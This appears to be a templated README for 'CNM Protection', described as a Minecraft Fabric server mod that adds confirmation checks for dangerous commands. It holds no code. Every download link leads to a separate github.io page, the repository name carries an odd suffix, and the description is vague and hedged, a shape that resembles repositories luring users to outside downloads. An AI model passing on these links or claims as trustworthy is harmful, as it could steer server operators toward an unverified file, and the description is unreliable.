# CNM Protection v1.0.0 - Game Script Utility 2026

> **A server-side Minecraft Fabric mod that adds confirmation checks for dangerous commands and provides command control tools across players, operators, consoles, RCON, command blocks, and data pack functions.**

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Minecraft%20Fabric%20server-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/byoung1995/cnm-protection-mod-win-35051?style=flat-square)](https://github.com/byoung1995/cnm-protection-mod-win-35051)

---

<p align="center">
  <a href="https://byoung1995.github.io/cnm-protection-mod-win-35051/">
    <img src="https://img.shields.io/badge/Download-CNM%20Protection%20Script-brightgreen?style=for-the-badge" alt="Download CNM Protection Script">
  </a>
</p>

> **[Direct Download - CNM Protection](https://byoung1995.github.io/cnm-protection-mod-win-35051/)**

---

[Download Latest Build](https://byoung1995.github.io/cnm-protection-mod-win-35051/)

---

## Overview

CNM Protection is a standalone server-side mod for Minecraft running on Fabric. It monitors commands that match configured dangerous-command rules and requests a second confirmation step before allowing them to continue. Interception covers commands issued by players, operators, the server console, RCON, command blocks, and data pack functions.

The mod also provides command cancellation and status inspection, then replays confirmed commands with the identity of the original source. Entity selectors can be analyzed automatically, while console logging records where intercepted commands originated. Configuration is focused on command rules and confirmation timing.

---

## Script Features

- Intercepts configured dangerous commands from multiple execution sources.
- Handles requests from players, operators, console input, RCON, command blocks, and data pack functions.
- Requires an additional confirmation before a matching command executes.
- Supports cancellation of pending command requests.
- Provides status checking for active confirmation requests.
- Replays approved commands using their original source identity.
- Automatically analyzes entity selectors used by intercepted commands.
- Offers configurable command rules and confirmation timeout behavior.
- Logs interception sources in the server console.
- Works as a standalone Fabric server mod without requiring Fabric API.

---

## Setup

1. Download the latest CNM Protection build from the [download page](https://byoung1995.github.io/cnm-protection-mod-win-35051/).
2. Confirm that the file matches your Minecraft Fabric server environment.
3. Stop the server before installing the mod.
4. Place the downloaded `.jar` file in the server's `mods` directory.
5. Start the server and review the console output for interception events and available configuration details.
6. Adjust the dangerous-command rules and timeout according to your server workflow.

Keep a copy of the existing server configuration before changing command protection rules. Test command behavior with a controlled account or test world before applying changes to an active server.

---

## Options

The available behavior is centered around command interception and confirmation handling:

| Option | Purpose |
| --- | --- |
| Dangerous command rules | Selects which commands require a second confirmation step. |
| Confirmation timeout | Defines how long a pending command request remains available. |
| Command cancellation | Allows a pending request to be withdrawn before execution. |
| Status checking | Displays the state of relevant confirmation requests. |
| Entity selector analysis | Examines selectors included in intercepted commands. |
| Source logging | Records the origin of intercepted commands in the server console. |

The exact configuration format and command syntax may vary by build. Refer to the files and console output included with the downloaded version.

---

## Compatibility

- **Target platform:** Minecraft Fabric server
- **Runtime model:** Server-side
- **Fabric API:** Not required
- **Covered sources:** Players, operators, server console, RCON, command blocks, and data pack functions
- **Version note:** The supplied profile does not specify an exact Minecraft or Fabric loader version. Verify the selected build's metadata before installation.
- **Operational limitation:** Protection applies to commands covered by the configured rules. Commands outside those rules are not described as requiring confirmation.

---

## FAQ

### How do I install CNM Protection?

Download a build, stop the Fabric server, copy the mod `.jar` into the server's `mods` directory, and restart the server.

### Does it require Fabric API?

No. CNM Protection is described as a standalone server mod that runs without Fabric API.

### Which commands are intercepted?

Commands matching the configured dangerous-command rules are intercepted. The system can receive commands from players, operators, console, RCON, command blocks, and data pack functions.

### Can a pending command be cancelled?

Yes. The mod supports cancellation and status checking for confirmation requests.

### What happens after confirmation?

The command is replayed using the identity of its original execution source.

### Can I change which commands need confirmation?

Yes. Dangerous-command rules are configurable. Update the relevant settings for the build you installed and restart or reload according to that build's instructions.

### How long does a confirmation request remain active?

The timeout is configurable. Check the installed build's configuration or console guidance for the supported value and format.

### Does the mod analyze entity selectors?

Yes. Entity selectors in intercepted commands can be analyzed automatically.

### Where can I see interception activity?

Interception sources are written to the server console through the mod's logging behavior.

### How do I handle updates?

Download the newer build, stop the server, replace the existing mod file, review any configuration changes, and start the server again. Test the updated behavior before returning to normal server operation.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
